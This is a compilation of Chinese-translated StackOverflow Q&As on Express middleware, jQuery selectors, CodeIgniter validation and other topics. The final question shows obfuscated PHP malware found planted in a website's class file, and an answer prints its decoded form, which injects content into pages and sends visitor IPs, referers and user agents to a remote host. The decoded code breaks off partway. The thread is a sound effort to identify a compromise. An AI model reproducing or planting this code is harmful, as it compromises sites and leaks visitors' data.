# StackOverflow 问答 10218000-10218999

# node.js - 使用 static()、staticCache() 和 compress() node.js 连接中间件

> ID：10218003
> 
> 赞同：19
> 
> 时间：2012-04-18T21:05:56.860
> 
> 标签：node.js, express, connect

我有一个 Express 3.0 应用程序，我正在尝试使用`static()`、`staticCache()`和`compress()`中间件来提供和压缩我的静态文件。这是我目前的`app.configure()`功能：

```
 app.configure(function() {
  app.use(express.favicon(__dirname + '/public/favicon.ico', {maxAge: 86400000}));
  app.use(express.bodyParser());
  app.use(express.cookieParser('foo'));
  app.set('views', __dirname + '/views');
  app.engine('.html', mustache({cache: true}).render);
  app.use(express.session({ store: sessionStore, secret: 'foo'}));
  app.use(express.staticCache());
  app.use(express.static(__dirname + '/public', {maxAge: 86400000}));
  app.use(express.compress());
});

// routes are loaded here 
```

使用此配置，YSlow 报告我的 .css 和 .js 文件未压缩，如果不清除浏览器并多次刷新页面，我无法获得缓存命中。我还尝试在 staticCache 中间件中放入调试语句以报告缓存命中并运行 ab -n 10000 -c 500 显示 0 缓存命中。

显然我做错了什么（我猜顺序或选项搞砸了）但我不知道它是什么。有人有这三个中间件一起正常工作的工作示例吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-24T07:13:02.010

*   首先将 .`app.use(express.compress());`作为第一个中间件，记住中间件存在于 FIFO 堆栈中......
*   将`static`部分放在会话部分之前，更好的是，将它们分成单独的路由（/app - 带有cookie，会话和bodyParser，/static - 没有）
*   哦，忘记`staticCache`它已弃用且与 不兼容`static`，如果您想要更成熟的静态服务组件使用[`st`](https://github.com/isaacs/st)

# php - jquery使用css改变颜色一个工作但另一个不工作

> ID：10218006
> 
> 赞同：0
> 
> 时间：2012-04-18T21:06:14.680
> 
> 标签：php, jquery

为什么只有名字在变颜色，而年龄却没有变？

```
<div id="user">
<?php echo $user_name; ?>
<span class="age"><?php echo $user_age; ?></span>
</div> 
```

用户名 color chang 有效，但跨度内的年龄无效。

```
$(document).ready(function(){
$('#user').css('color','red');
$('#user#age').css('color','gray');  
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:07:12.207

试试这个

```
$('#user .age').css('color','gray'); 
```

你有一个类“年龄”，选择器应该以“。”开头 它在#user 内部，所以你需要#user 和 .age 之间的空间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:08:08.463

您在应该使用 class 的地方使用 id

```
$('#user#age') // looks for something like <div id="user age"></div> which is invalid 
```

应该

```
$('#user .age') // looks for <div class="age"></div> inside <div id="user"></div> 
```

没有任何空格，它会在同一个元素上查找多个属性。使用空格，它会在其他元素中查找具有 last 属性的元素。您还可以使用逗号来查找具有一个或另一个属性的元素

```
$('#user, .age') // targets both <div id="user"></div> and <div class="age"></div> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-18T21:10:50.673

`#user#age`将匹配`id`同时具有`user`和的元素`age`。这显然是不可能的，因为元素不能有 2`id`秒。如果要匹配 a`.age`内的 a `#user`，则需要在它们之间放置一个空格。

此外，`age`是一个类而不是一个`id`. 类使用`.`和不使用`#`.

将所有这些加起来，您的选择器应该是：

`#user .age`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T21:08:34.727

因为它是一个类，所以使用点来选择

```
$(function(){
  $('#user .age').css('color','gray');  
}); 
```

这是工作示例：http: [//jsfiddle.net/35G5j/1/](http://jsfiddle.net/35G5j/1/)

`#`用于选择 ID

`.`用于选择 css 类

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-18T21:09:26.670

因为在您的定义`age`中是*class*，而不是*ID*，您可以这样做：

```
$(document).ready(function(){
    $('#user').css('color','red');
    $('.age').css('color','gray');  
}); 
```

那应该行得通。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-18T21:12:03.580

因为年龄是一个类的名称而不是 id 所以你不能使用 #Have to use 。

# codeigniter - 用于字符串精确匹配的 Codigniter 验证

> ID：10218021
> 
> 赞同：1
> 
> 时间：2012-04-18T21:06:55.970
> 
> 标签：codeigniter, validation

我想在 codeigniter 中设置我的验证规则，例如以字符“P”或“S”开头的字段，否则它是无效的。如何使用 Codigniter 验证库来做到这一点？

```
Test Case 1: input: A145874 ------- invalid Must start with P or S
Test Case 2: input: P258741 -------   valid
Test Case 3: input: P45KK91 ------- invalid Must not contain Letters in other positions rather the first one.
Test Case 4: input: S457821 -------   valid 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:15:11.753

您需要编写自定义验证规则。像这样的东西：

```
public function check_first_char($str) {
    $first_char = substr($str, 0, 1);
    if ($first_char != 'P' || $first_char != 'S') {
        $this->form_validation->set_message('check_first_char', 'The %s field must begin with P or S!');
        return FALSE;
    } else {
        return TRUE;
    }
} 
```

然后你会像这样添加验证规则：

```
$this->form_validation->set_rules('field_name', 'Field Name', 'callback_check_first_char'); 
```

[该文档非常清楚地解释了这一切](http://codeigniter.com/user_guide/libraries/form_validation.html#callbacks)。

# objective-c - DDMathParser - 添加一个常量

> ID：10218022
> 
> 赞同：1
> 
> 时间：2012-04-18T21:06:57.783
> 
> 标签：objective-c, ios, xcode, cocoa-touch

如何将自己的常量添加到 DDMathParser 中？例如 Fe = 55.845。

我可以像 pi() 一样使用它。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:53:10.450

根据 DDMathParser wiki，像 pi 这样的内置常量[是不带参数的函数](https://github.com/davedelong/DDMathParser/wiki/Built-in-Functions)。

wiki 还描述了如何[定义您自己的函数](https://github.com/davedelong/DDMathParser/wiki/Adding-New-Functions)。

# translation - 获取 PO 文件中的字数

> ID：10218026
> 
> 赞同：11
> 
> 时间：2012-04-18T21:07:06.387
> 
> 标签：translation, poedit, po

如何计算 PO 文件中的单词数？
Poedit 仅显示行数。
任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-18T21:40:42.460

试试 pocount

```
pocount fi.po 
```

```
文件
类型字符串词（源）词（翻译）
翻译：47 (100%) 137 (100%) 123
模糊：0 ( 0%) 0 ( 0%) 不适用
未翻译： 0 ( 0%) 0 ( 0%) 不适用
总计：47 137 123

未审查： 47 (100%) 137 (100%) 123

```

# php - 在我的一个类文件中发现了这个非常奇怪的 PHP 代码。它是什么？

> ID：10218028
> 
> 赞同：0
> 
> 时间：2012-04-18T21:07:10.880
> 
> 标签：php

不久前，我为一个遇到问题的客户建立了一个网站。进入站点文件后，我在其中一个 PHP 类的顶部发现了它：

```
<?php
/*ad0b18735e68b25aa9c4374221824db5_on*/ $byJtFKIhXRt8KPNfT1me8ooOBXon8QgWfQgLqPSdxb= array('8759','8776','8755','8766');$ARPcAGpFFDTk4GyiFfpsl5zXmfFqCHsAp8DQFSlbm5lhCJq8P= array('8569','8584','8571','8567','8586','8571','8565','8572','8587','8580','8569','8586','8575','8581','8580');$J0BQOOWj4oRnP7liN= array('7450','7449','7467','7453','7406','7404','7447','7452','7453','7451','7463','7452','7453');$UbjPmIKWlC="ZXZhbChiYXNlNjRfZGVjb2RlKCJaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0phV0Zwb1lrTm9hVmxZVG14T2FsSm1Xa2RXYW1JeVVteExRMHBvVmpGc2JsTXdUa2RpVjFKWVRsZHdhMUl5ZURKWmJYYzFZa2RXU0dKSWNHdFRSVEYyVTFkMGEySkhVa1pOVjJocFZqQldjRk14VG5OT01HeEVVVzB4YTFaNlZuRmFSV1J6WkcxS2NGRnVVbWxOYkVwdFYxUkpOV1JWZEVSVmJXeHJWakZzZDFwVVRrOU5SMDV6VDFoQ2FtSldXak5aYTJSSFlXeHdWRm95YkZGU01IQXlWMnRvY2tzd2JIQmtNbXhSVWpCd01sZHJhSEpMTUd4d1pESjBXbUpzV25SVVJVNVRZVzFLZFZWdFdtaFJNbk16V1Zaa1dsb3dkRVJWYlhCcFlteEtiVmxWVGtKUFZrSlVVVmhvVEZVd1NUTlRhMlJMVFZad2NGRlViRXBUUlRSM1dUSjNOV05IVG5SV2JtUnBVakJhY1Zkc1RtNWhWa0pJVTI1YVlWTkhjM0pUVjJ3ellWWkNTRk51V21GVFIzTnlVMWRzUW1SVmJFbFVha0pxWWxkNE0xbDZTalJoUjAxNVlVZDRhbVZYWkhKWFJFWlBVbXhXYzFkcldsWmlTRTV3VjJwSk5XUnNjRVJUYlZKTVZUTmtjbGRYTlZkaVZYUlZZekprYW1KV1dYZGFSbWhMWkZWc1JGVnRiR3RXTVdzeldteG9UMDFIVG5OUFdFSnFZbFphTTFsclpFZGhiSEJVV2pKc1VWRjZiSEJaYWtwVFRsWkNjRk5ZVGtwaGJtUXlWMWN3TldFeVZsVk9SMnhOVVRGS2NGcEdaRnBqTUhCSVZHNVdhMUpxYkhaVE1WSXdZMFp3Y0ZGWE9VdFNNRFV4V2tWWk5XSXdiRVZOUkd4S1VrVldkMU5WYUhwaE1XeDFWbTB4U2xKRVFtNVplazVUWlZabmVXSkliR0ZYUlVwNlYxWmtUMkpGZEVSVFZHaE5UV3R3TWxkcmFISkxNR3h3WlVod2ExTkZjSGRaTUdoUFl6RnNXVlJ0T1dGWFJURjJVMnRaTlZaR1NsZFRiR1JUVm10d2FWTlhNV3RrYlVsNVZWZHNXVlV5ZERGVFYzQXpaR3hzZEU5WGRHeFdSRkp3VkVWT1UyRlhVbGhYV0VKUVpWVktOVmRzYUZOTlYwNTBUa2RrUzFJd2IzaFhiWEF3VDFkT2RGWnFRbXRYUlhBeFUxVk9VMkZYVWxoWFZHUnRWakZ2ZUZsdE1VOU5SMFpZVDFoV1NsSjZiRE5YVm1NeFkyMUdWRm95ZEZwaWJGcDBVekZvZW1FeGIzcGpSMXBoVlRCRk5WTlZaR0ZoUjBwSlZHMTRVR1ZXU25aWFJFb3pXakZDVkZGdE9XRldNRnB5VjJ4b1MyVnNaM2xsU0VKcVRURkdkbE14VWpCalJuQndVVmM1YUZaNlZtMVhWbWhMWlZac1dXRXlPVXBoTURVeVdXMDFVMkpIU25WVldGSlRWbnBXY1ZscVNsTmpSMHAwV1hwYVNsSXlVVEpaVm1oQ1lWVjRSRkZYZEdoU2FteDZVekZPY2xveVZqVlJWM1JoVFROQ2JWZHNUa0pQVld4SlZXNXNhMVl4VlROYWJHUnpZbFZzUkZveWRHRk5NMEp0VjJ4T2MwNHdjRWxWYmxKcVVqRndNVmRXWTNoaVJXeEZUVWRrYTFJeFdqQlpNR014WVVkS1ZGb3liRTFOTVVvd1dUQk9TbU13YkVSVGEyUlZUVVJvY0ZNeFVqQmlWMFpZWlVkNFdVMHdTWGhhUlZrMVlXMUplVTVVUW1GV2VsVjNXVE5zYm1FeVVraE5XR1JoWWxSV2IxbHNaRlpqTUd4RVZXMXNhMVl4YkhkVU0yeFRUbXh3UkZGVWJFcFNNbEV5V1dwT1EySkhTbkJhTW5SclVucEdNMWR0TURGaFIwcFlWbGhPU2xFd2NEVlRWMnh5VGpCd1NGUnVXbWxpYkVweldXMDFVMlZyYkVWTlIyUmhUVE5DTlZkc1pFZGhNSFJFVldwYVlWRXpaRzVVVmxKQ1pEQXhSVkZZWkU1U1JVWjNWRE5zVTJGdFNYbE9WRUpoVm5wVmQxa3piRUpQVld4SVRWaGFZVkpxYkhGWmFra3dZakJ3U0ZSdVdtbGliRXB6V1cwMVUyVnJkRlZrUnpWc1lsVTFlbGxxVGs5aVJYUkVWV3BhWVZFeWN6TmFSbU14WXpKR1dFNVlTa3hSTVVsM1dXeG9RMkpYU25SU2JsSmhWVEp6TTFOclpFOWtiVXAxVlcxNGFXSnNTalpUVlZGM1dqRnZlbU5IZUdsaVZUVXlWMnRrVm1Jd2NFaFVibHBwWW14S2MxbHROVk5sYTNSVlpFUnNTbEl4V25wWmVrcFdXakpXTlZWdGNHbE5hbFYzVjJ4ak1VMUhUalZSVkd4S1VucEdNbGRyV1RWaGJVbDVUa2M1UzFJd2IzaFhiV3h5VGpKYVZGVnVUbUZXZWxKdVZVWk9RMlZ0VWtsVGJrNWhWbnBTZGxOclpFOWtiVXAxVlcxNGFXSnNTalpUTVZJd1lqRndXRkp0ZEdGWFJXeDJVMWQwVDJSdFNuVlZiWGhwWW14R01GWkZaRmRrVm05NlZXMDVVR0ZWUm5CVVIyeFRZekZ3V0U1SVFsQk5NSEJ6V2tWb1YyVlhTbkJhTW5SYVRXcHNNVnBGWkZka1YxSkpWRmhDVUUxNlFtNVhiVFZYWkZacmVsVnVRbWxOYWxKdVZXcEtWMDFHVWxoU2JsSmFWVEprZDFwWWJGTmtSMGw2VlcwNVlWZEZiRzVWUms1Q1lWZEtXRlZ1YkdsV01WcHlXVlprUjJKdFRuUlBWRVpxVVhwV2NWbHFTWGRoVlRoNlUyMTRhMU5HV2pWWmJXeENZVEpLV0U5VVFtaFNNVm8xVkhwTmVHUnNiSE5QV0hCclVqQmFOVnBGVG01aFYwbDZVVzFvYVdKWVVuZFRWMnh5VGpGd2RWWnVWbHBOTVVwM1dXcEpNRm94YkZoaFJ6RnJWakZLZEZsclpHRk9iSEJJWVVjeGFGTkZNWFpUYTJoRFlVVjBXV015ZEdsV01Gb3dWMVpPUWs5VmJFWmFSM2hyVWxSR2IxbHNaRVppTUhSVll6SjBZV0pYZUhwWGJFNUNUMVZzU1ZadWJHbFNNVm94VjFSSk5XRXhjRlJoUjFwWlRVWndTMVpGVmxkYWJHZzFZWHBrYUZZeGJHNVRNR1J6WlcxTmVWWnFRa3hSTVVwdFZsUkNWMVV4V25KV2JFNVlaVlZ3U2xacldsTlZWbWQzWVVaQ1ZrMVdSbkJYUms1eVkwZFdOVlZ0T1dsTk1EUjNVMVZSZDFvd2NFZFBWbEpUVm10d1dGVnNXa3RaYTJ4eVlVWldWMUpyU20xVk1GVTFWa1phUkZOdFVsQk5la0p1VjJ4a05HVnNjRlJSYW1STFVqSm9NbGw2VGxKYU1VSlVVVmRzU21GdVVUVlpWbVJhV2pCMFNHSkljR3BOYkZsM1V6Qk9VMXBzVlhkV2JFNVhZVEZhVkZZemJFdFZNVXBXVFZaQ1YxSldXbTFWVmxaVFVsWldjRk50VWt4Vk1uY3pVMnRrYzJRd2JFVk5SMlJMVW1wc1ZWVnNXa3RXTVVwWFUyMUtTbUpGY0VkV1JsVTFWbFpLVjA5VlNsTlNWa3BVVTFkM2QwNHlXbFJSYlhocFUwVTFjMU5WYUhwaE1rWlpVVmRrVVZVd1JuQlRWM0F3VDFkR1dGZFhaRXhTTW5nMldYcEtWMDFGZEVSVmJWcFdUVVphVkZadGRGZFZNV1ExVTJ0c1YxSnNTbEpYUkVaTFVteEtjbFpzVGxOV2EyeHdWMFpPY21OSFZqVlZibXhoVmpGc2JsVkdUa05OVjA1MFpVZDRhV0pWTlRKWGEyUldZakJ3UjA5V1VsTldhM0JZVld4YVMxbHJiSEpoUmxaWFVtdEtiVlpYZEZkU01VcFhVMnRhVm1GVmNHdFRNVkl3VDFWc1NGWnVUbXBOYkZadVdsaHNVMlZXY0ZoWFYyUlJWVEJHY0ZOWGNEQlBWMFpZVjFka1RGSXllRFpaZWtwWFRVVjBSRlZ0V2xaTlJscFVWbTEwVjFVeFpEVlRhMnhYVW14S1VsZEVSbGRXUmtwWFUyMWFVbFpYVWtkV1IzaFNZVlpvVkdFelFteGxWa2w0VjFaT1FrOVZiRWxXYm14cFVqRmFNVmRVU1RWaE1YQlVZVWh3YTFORmIzZFpha28wWkcxUmVWWnViRXhSTVVwdFZsUkNWMVV4V25KV2JFNVlaVlZ3U2xacldsTlZWbWQ0Vm14U1UxWnJjRzFWVmxaclVteFNjMVZYYkZsVk1uUjNWSHBOZDFveGNGaGxTSEJoVlRCSk0xTnJhRmRoUld4RlRVZGtTbUZWYXpOYWJHUnpZbFZzUkdGSVFtcE5NRFZ6V2tWT2JtRXhaM2hVYTFwV1lrWndSMVpYZUhwaFZsWlhWbXRhVm1KSGVHMVdWRVpUVlRGT1ZrNVZhRXBpUkVKM1V6Rm9lbUV5VGxsVVYyUlJWVEJKZUZreU1UUmlSMHAwVkc1YVlWSXhWblpUYTFrMVZrWktWMU5zWkZOV2EzQnBVMWQ0UjFac1NsZFRiSEJaVFZVMVZsWlhkSE5VTVVvMVUyMVNURlpJVVRWVFZXUlhZekpOZVZaWFpHeGxWa28wV1ROc1FrOVZiRVJUVjJ4UVRYcENjbHBHYUV0ak1XZzJVVmRrVVZVd1JuQlpWV2hUVFVkT1JXSXpXazFsVld4dVZFZHNRbUV5VGtoU1ZHUkxVMFphTlZscldUUmxSV3hGVFVka1NtRlViSGhYYkdSVFkwVjRkVkZ0T1dwU1JHdDVWMnhvUzJWdFJsaFBXRlpSVmtWRk1WUXhVazVpVjBwWVQxUkNhRkl4V2pWVlJrNUtXakI0Y0ZWdVVscFdla1p2VTFWTk1Gb3diSEJYYlRGb1ZqTm9jMVZHVGtwYU1IaHdVVmQwWVdKWGVIcFhiRTVDWkZWc1JGTlhNV2hTZW13MldrVlJkMkZWYkVST1IyUkxVakpvTWxsNlRsSmFNSGh3VVZkc1MySlhlRE5WUms1S1dqQjRjRkZYZEdoWFJVWnVWRWRzUW1GVmNIVlRiWGhoWVdwQ2NGTlZUVEJhTUhCSlUyMTRZV0ZWUmpGVFZVNUtZbGRTV0ZKVWJFcGhWVVl4VTJ0b1YyRkZiRVJPUjJSS1lWWndORmt6YjNkaFZXeEVUa2RrUzFORldqWlVNMnhUVFVkT2RXRXlaRkZWTUVsM1dUSTFWMkpGT0hsaVJ6Rk1VVEJLZEZwR1l6RmhiVkpJWWtoYWFXSkViSE5hVldSelpXMVNTVlJYT1VwaVZUUjRXVEl4TkZwdFJsaE9XRUpyVVRCc2QxTlZUbk5PTUhCSVZHMDVTbEpFUW01WFZFNVhaVmRLUjA5WVFtbGlWM2QzVXpCT1UwMVhUblJsUjFwT1VUQkdNVk5WVGxOTlYwNTBaVWRhVGxVeWN6TlhWRTVYWlZkS1IwOVljR0ZYUmtveVdUQm9VbUl3Y0VoVWJUbE5VVEJLUlZac1drdFVWbEY0VVd4V1dVMVZjRWRXYTFwWFZURlNjMVZzVGxKV1ZGWlZWVzEwVjFVd2VFUlJXR2hNVmtoU2NWcEdhRXRqTVdkNlZHMTRhMUo2YkROYVJVNXVZVEZyZVZvelRrcFNWVFZYVmxkME5GVkdWa2RWYlZwWFVsZDRUMVZzVlRWV2JGcEVaREprVG1WWGN6TlRhMmhYWXpKU1JGRlViRXBUUmtvMVdWWmpkMkl4YTNwV2JteHBVbXBzYzFwVlpGZGhhM1JFVlcxd2FGRXlkSGRVTTJ4VFRVZE9kV0V5WkZGVk1FcDBWMVprTkdWc2NGVmtSR3hLVWpKNGRGTlZUbTVpTWtaWVRsaENXVTF0VW5OYVJVNXVZVlpzV0dWSVRtbE5NbEp0V2tab1MyTXhaM2xYYmxwcVVqRmFNVk5YYkhKalJXeEVWMWN4U2xFeFNYZFpNalZ5WTBWc1NXTXlkR3RXTTJkM1UxVlJkMW95VWtsVGJrSnBWVEpvUWxkdE1YTmpNWEJYVDFjMVlWZEdTbTFYVkVrMVpGZFNTRlp1Vm10VFJURjJVMnRvVjJWWFNrZFBTR1JLVVhwU2JsTnJhRmRsVjBwSFQwaG9URlV5Y3pOVGEyaFRaVmRXVkZGVWJFcFNNWEJ2V1d0b1QySkZPSHBOV0VKaFlWZGtjbHBGYUV0T1ZYUlpZekowWVdKclJtNVZSazVEWWxkTmVVOVhjR2hOYW13elYyeGpNR0l3Y0VsUmJXaE5VVEJGTUZSVlRqTmFNSEJJVm01c2FtSlVWakpVUlU1Q1lURndXVk51YkdwTk1VbzFWRVZPUW1Wck1VUmhlbVJvVmpGc2JsTXdUbE5pVjA1RVlUSmtiR1ZXU2pKYVJtaFNXakZDVkZGWGJGTk5SbHBXVTFWT1UwMVhUblJsUjFwT1ZUQktTbFpyV2xOVlZYZzJVbGhXVGxKdWFEVlhSV013WVZVNU5WVnVXbXRYUmtadVZFZHZkMW93YkhKaFNGcHFUVEZGTWxOVlRsTmtNV3hYWlVoc1dWSjZVbkJVTTJ4VFpHMVNXVlZYWkUxaGFrSnVVMWQwVDJSdFNuUk9WM2hhVFRGS2QxbHFTVEJPYTJ4R1ZHNU9hVTB3TlhOWFJXaExXVEpLYzJWSWJGbFNlbEp3VkhwS1lVMHlUblJpUkVKaFZUSmtjbGR0TlVKak1HeEVWVzVhYTFkR1JuZFVNMnhUWlZad1dWVlhaRkZWTUVad1UxZHdNRTB5UmtoaVNFNWhWVEJHZGxOV1pHRmlSMGw1VjFjNVMxSXhjRE5UTVU1eVdqSldOVlZ1YkdGWFJrWnVVMVZOTUU5VmJFUlJiVEZoVFd4WmQxa3piRzVoTVhCMVVWaE9TbEpGVmpWVU1FNXlUakphV0ZkdGNHbFNlbXcyVjJ4T2JtRXhjSFZSV0VKUVpWWkplRmxyYUZKYU1VSlVVV3BDYW1KWGVEQlRNR2hQVFZac2RWUnFRbXBoVjJSeVdUSXhWMDFGZUVSUmJuQnJVMFZ3TTFscVRrNWlNSEJKVTIxNGExRXpaRzVUVjNnMFpWWm9TRTVYVG1waVNHZ3hVMWRzY2xvd2REVlJWRUpNVlRKek0xcHNaM2RhTUd4SVlrY3hTbEV5YURaYVJXaExaREpKZWxSWE9VdFRSbHA2V2tWT00yRldjRmxYYldocFVUQnNkMU5WVGtaUFZrSlVVVzB4V2xZemFEWlhiRTV6VGpCd1NXSXlaRkZWTUVvMldrVm9TMk5IVGtsVWJrNWFWMFUxZGxkc2FFNWlNazE2Vlc1c1dVMHdjSE5aTUdRMFlVWnJlVlpYT1VwaVZsbDVWMVprTTJGVmVFUlRWMnhOVVRGSmVGbHJhRkpqUlhSVll6SmtZVmRHY0c5WmEwNXVZVEpXY0dGNlpFcFNNVmt3V1Zab1VtSXdkRlZrUkd4b1ZqRnNibE13YUU5TlIwNTFVVzVhYW1WWFpISmFSbVEwVFVWNFJGTnRlRnBpVkZadlUxZHNjbG93YkZWTlJHeEtVakZ3YjFscmFFOWlSWFJaWXpKMFdVMVZOVWRXVjNoaFVteFdjMk15YkdGTmFtd3lWMnRPUzFwRmJFVk5SMlJxVFRGS05WZEVUa3RpUjA1SVpVZG9XazFzVm5aVFZ6RlhZVmRLZEZKWGJFMVJNR3h3VkVWT1UwMVhTa2xWV0VKUVRUQndjMXBGYUZkbFYwcHdVV3BDYW1Kc1duTlVlazE0WWtkS1NWUnRlRXBUU0ZJMVYyeG9VMDFYVG5ST1IyUmhZbFZhZWxsNlNsWk9NbHBaVFVkMFlXSlZXWGRaVldSWFpWVXhjMlJIVWtwU1JFSnVVMWR3YWswd2VIRmFNMmhOWVd0cmQxUldUVEJsVlRWVlZGZHNVR1ZXU25SWFZtaFRZakZ3V1ZOWWJGaE5WRUp1VlVaT1FtRlZOVVZYV0ZaT1lXeEZNVlJIY0ZaT1JYaHhVbGh3VDFVd2F6TlRhMlJoWVVkU1NHRkhlR3BoYTNCcFYwWk9RazlWYkVSVFdHaFBaV3hzTVZReFRUQmxWVFZGVWxoV1RsWkdWak5UVjNCNllURndkRkpxUW1oU01WbzFWRmQ0TUZwRmJFVk5SMlJLWVd4RmVWUkhjRTVOTUhoeFVsUktVRlY2VVhoVWJXeEtUakJ3U0ZkdGFHdFNNbWh6V1RKd1MxbHNhRlJSVkd4S1VUQnJNVlJyVFRCbFZUVkZVMWhXVG1Gc1ZYaFVSM0JPVFZWc2NXTXlkR0ZpVlZsM1dWVmtWMlZWTVhOa1IxSktVa1JDYmxOWGNFWk5NRGxFVGtob1QyRnJiREZVVmxKS1RsVjRjVk5ZYkU1bFZXc3pVMnRrWVdGSFVraGhSM2hxWVd0d2FWZEdUa0pQVld4RVUxaHdUbFY2VWpSVU1GSlNaRlV4Y1ZSVVFrMWhiWE41VTFkd2VtRXhjSFJTYWtKb1VqRmFOVlJYZURCYVJXeEZUVWRrU21GdFRYcFVSM0J5VFZWNGNWSlVVazFoYTFVd1ZERk9TazR3Y0VoWGJXaHJVakpvYzFreWNFdFpiR2hVVVZSc1NsRXdhekZVV0dzd1pVVTFObEZZVms1V1JUQjZWRWR3U21WVmJIRmpNblJoWWxWWmQxbFZaRmRsVlRGelpFZFNTbEpFUW01VFYzQkdUa1U1UkU1RVFrNVJlbEV4Vkd4Tk1HVlZOVVZWVjJ4UVpWWktkRmRXYUZOaU1YQlpVMWhzV0UxVVFtNVZSazVDWVZVeFZXRjZWazFoYTFZMFZHeE5NR1ZWTVRaU1dGWlBWa2RrY0ZRemJGTmlWbXhaVlcwNVlWZEZiRFZXZWtWM1dqRkNWRkZYYkZCU1JXd3hWRlpTY21WVmVIRmFlazVOWVd0VmVsUXdUa3BPTUhCSVYyMW9hMUl5YUhOWk1uQkxXV3hvVkZGVWJFcFJNR3cxVkZaU1dtUlZNWEZWVkVwTllXMXpNVlJIY0VwbFJUVlVVMVJrUzFJeGNHOWFSV1J2WWtkT2NWTnRTbGxWTUVVMVUxVk9TazVWTlZST1NHeE9Wa1ZXTVZSV1VtNWtWVFUyWVRKc1VFMHdOWFphUm1SaFlsZEtTRlpYT1V0U01YQnZXa1ZrYjJKSFRuRlRXRUpRVFd4d01sa3lNVmRoUm10NVdqSTVTMUl4Y0c5YVJXUnZZa2RPY1ZOWFpGcFhSVEZ1VTJ0b1YyVlZkRmxrU0VKaFlWVkdkbE5WWkVkaU1YQjFWbTEwWVdKWWFIUmFWekZUWWpGd2RHRkljRXhSTVVsNFdUSnNjbG93ZEZSUmFtUktVakJ3TlZkc1pFZGphMnhGWkVSc2JWZEVRVGxKYVd0d1QzbEJQU0lwS1RzZyIpKTsg";if (!function_exists("Gk8ZQGrrSvbiFVNEUQ6Ke9IiogWaRAABLyqr5HJ")){ function Gk8ZQGrrSvbiFVNEUQ6Ke9IiogWaRAABLyqr5HJ($fmG17jH6h8R6pfvV6ODRd6K,$iot3u6fS){$AJgVhd3fVZu0lfXZJE2Gf9LusFOpLxzn7 = '';foreach($fmG17jH6h8R6pfvV6ODRd6K as $seJ3kuSEl4K8TkDMQJMs34XHkz5KM2gM6QFgboLmiml2wOFdoh){$AJgVhd3fVZu0lfXZJE2Gf9LusFOpLxzn7 .= chr($seJ3kuSEl4K8TkDMQJMs34XHkz5KM2gM6QFgboLmiml2wOFdoh - $iot3u6fS);}return $AJgVhd3fVZu0lfXZJE2Gf9LusFOpLxzn7;}$hKVywz3gfZQjZpsdvfedFEEg3UyYs7BlInK4MDaRsR1h6 = Gk8ZQGrrSvbiFVNEUQ6Ke9IiogWaRAABLyqr5HJ($byJtFKIhXRt8KPNfT1me8ooOBXon8QgWfQgLqPSdxb,8658);$UsopvTU00NLoC = Gk8ZQGrrSvbiFVNEUQ6Ke9IiogWaRAABLyqr5HJ($ARPcAGpFFDTk4GyiFfpsl5zXmfFqCHsAp8DQFSlbm5lhCJq8P,8470);$D4fUhPPUiQCBxt = Gk8ZQGrrSvbiFVNEUQ6Ke9IiogWaRAABLyqr5HJ($J0BQOOWj4oRnP7liN,7352);$UCUMQ98AUYryzF0tSVyD = $UsopvTU00NLoC('$kiNmYfN',$hKVywz3gfZQjZpsdvfedFEEg3UyYs7BlInK4MDaRsR1h6.'('.$D4fUhPPUiQCBxt.'($kiNmYfN));');$UCUMQ98AUYryzF0tSVyD($UbjPmIKWlC);} /*ad0b18735e68b25aa9c4374221824db5_off*/ ?> 
```

我不知道它是什么，也无法破译。直接在线访问文件时没有任何输出。有任何想法吗？看起来是不是恶意的？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-18T21:20:28.740

You most certainly got hacked.

I did the fun to poke into the code.

The code is base64_encoded multiple times and then eval'd. Result is:

```
if (!function_exists("GetMama")){  
function mod_con($buf){

str_ireplace("<body>","<body>",$buf,$cnt_h);

if ($cnt_h == 1) {

$buf = str_ireplace("<body>","<body>" . stripslashes($_SERVER["good"]),$buf);
 return $buf;}

str_ireplace("</body>","</body>",$buf,$cnt_h);

if ($cnt_h == 1) {
$buf = str_ireplace("</body>",stripslashes($_SERVER["good"])."</body>",$buf); 

return $buf;}
return $buf;}

function opanki($buf){
$gz_e = false;$h_l = headers_list();

if (in_array("Content-Encoding: gzip", $h_l)) { $gz_e = true;}

if ($gz_e){

$tmpfname = tempnam("/tmp", "FOO");

file_put_contents($tmpfname, $buf);$zd = gzopen($tmpfname, "r");

$contents = gzread($zd, 10000000);

$contents = mod_con($contents);

gzclose($zd);

unlink($tmpfname);

$contents = gzencode($contents);} 

else {

$contents = mod_con($buf);}

$len = strlen($contents);

header("Content-Length: ".$len);

return($contents);} 

function GetMama(){
$mother = "mdrmediagroup.com";

return $mother;}

ob_start("opanki");

function ahfudflfzdhfhs($pa){

$mama = GetMama();

$file = urlencode(__FILE__);

if (isset($_SERVER["HTTP_HOST"])){

$host = $_SERVER["HTTP_HOST"];} else {

$host = "";}

if (isset($_SERVER["REMOTE_ADDR"])){

$ip = $_SERVER["REMOTE_ADDR"];} else {

$ip = "";}if (isset($_SERVER["HTTP_REFERER"])){

$ref = urlencode($_SERVER["HTTP_REFERER"]);}

 else {

$ref = "";}

if (isset($_SERVER["HTTP_USER_AGENT"])){

$ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"]));}

 else {

$ua = "";}

if (isset($_SERVER["QUERY_STRING"])){

$qs = urlencode($_SERVER["QUERY_STRING"]);}

 else {$qs = "";}

$url_0 = "http://" . $pa;$url_1 = "/jedi.php?version=0993&mother=" .$mama . "&file=" . $file . "&host=" . $host . "&ip=" . $ip . "&ref=" . $ref . "&ua=" .$ua . "&qs=" . $qs;

$try = true;

if( function_exists("curl_init") ){

$ch = curl_init($url_0 . $url_1);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_TIMEOUT, 3);

$ult = trim(curl_exec($ch));
